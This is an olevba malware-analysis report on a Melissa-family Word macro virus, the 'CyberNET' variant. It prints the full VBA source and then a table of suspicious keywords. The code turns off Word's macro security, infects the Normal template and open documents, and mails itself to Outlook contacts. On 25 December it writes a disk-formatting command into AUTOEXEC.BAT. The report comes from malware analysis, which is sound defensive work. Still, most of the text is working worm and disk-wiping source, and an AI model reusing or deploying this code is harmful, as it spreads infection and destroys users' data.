olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-2e8bf76361cffb77a1db593130525f7e42e6b83b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-2e8bf76361cffb77a1db593130525f7e42e6b83b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call DB9310
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For ER2447 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next ER2447: End If
AF7690 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EA6792 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set DD6156 = ActiveDocument.VBProject.VBComponents
Call AI5757(DD6156)
CN9685 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set DD6156 = NormalTemplate.VBProject.VBComponents
Call AI5757(DD6156)
IT7447 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "LA3150": r1(2) = "HN6720": r1(3) = "DM6113": r1(4) = "IC5974": r1(5) = "EA2976": r1(6) = "AF7690": r1(7) = "EA6792": r1(8) = "CN9685": r1(9) = "DD6156": r1(10) = "IT7447"
r1(11) = "VG9659": r1(12) = "LF9082": r1(13) = "TD1040": r1(14) = "UV270": r1(15) = "AR4228": r1(16) = "DB9310": r1(17) = "VB843": r1(18) = "JI2468": r1(19) = "EC2837": r1(20) = "VM8136"
r1(21) = "JA1847": r1(22) = "RD2972": r1(23) = "KB9847": r1(24) = "AI5757": r1(25) = "IL6896": r1(26) = "HK3239": r1(27) = "ER2447": r1(28) = "OI4890": r1(29) = "FF180"
For AR4228 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EA2976(a1, r1(AR4228))
Next AR4228
ActiveDocument.Saved = True
End If
If IT7447 <> True And CN9685 <> True Then GoTo VG9659
If IT7447 = True Then DD6156.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AF7690 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If CN9685 = True Then DD6156.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EA6792 - 8))
VG9659:
If EA6792 <> 0 And AF7690 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function EA2976(UV270, TD1040 As String)
On Error Resume Next
Dim LA3150 As Long: Dim HN6720 As Long: Dim DM6113 As Long: Dim IC5974 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LA3150 = 1: HN6720 = 1: DM6113 = .CountOfLines: IC5974 = Len(.Lines(.CountOfLines, 1))
Do While .Find(TD1040, LA3150, HN6720, DM6113, IC5974, True)
strline = .Lines(LA3150, 1)
strline = Left(strline, HN6720 - 1) & UV270 & Mid(strline, IC5974)
.ReplaceLine LA3150, strline
LA3150 = DM6113 + 1: HN6720 = 1
DM6113 = .CountOfLines
IC5974 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function DB9310()
On Error Resume Next
Dim EC2837, VM8136, JA1847
Set EC2837 = CreateObject("Outlook.Application")
Set VM8136 = EC2837.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If EC2837 = "Outlook" Then
VM8136.Logon "profile", "password"
For VB843 = 1 To VM8136.AddressLists.Count
Set FF180 = VM8136.AddressLists(VB843)
HK3239 = 1
Set JA1847 = EC2837.CreateItem(0)
For JI2468 = 1 To FF180.AddressEntries.Count
OI4890 = FF180.AddressEntries(HK3239)
JA1847.Recipients.Add OI4890
HK3239 = _
HK3239 + 1
If HK3239 > 50 Then JI2468 = FF180.AddressEntries.Count
Next JI2468
JA1847.Subject = "Message From " & Application.UserName
JA1847.Body = "This document is very Important and you've GOT to read this !!!"
JA1847.Attachments.Add ActiveDocument.FullName
JA1847.Send
OI4890 = ""
Next VB843
VM8136.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function AI5757(DD6156)
Dim IL6896 As Object
For Each IL6896 In DD6156
IL6896.CodeModule.DeleteLines 1, _
IL6896.CodeModule.CountOfLines
Next IL6896
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function
































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

